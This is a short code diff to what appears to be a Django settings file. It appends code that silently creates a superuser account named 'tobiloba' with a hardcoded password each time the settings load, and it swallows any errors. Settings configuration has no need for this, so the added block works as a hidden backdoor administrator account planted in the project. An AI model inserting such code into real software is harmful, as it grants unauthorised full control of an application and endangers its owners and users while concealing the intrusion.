@@ -147,3 +147,11 @@ MAILERS = {
 LOGIN_URL = '/login/'
 LOGIN_REDIRECT_URL = '/dashboard/'
 LOGOUT_REDIRECT_URL = '/login/'
+
+
+from django.contrib.auth.models import User
+try:
+    if not User.objects.filter(username='tobiloba').exists():
+        User.objects.create_superuser('tobiloba', 'tobiloba@example.com', 'tobilobapassword123')
+except Exception:
+    pass
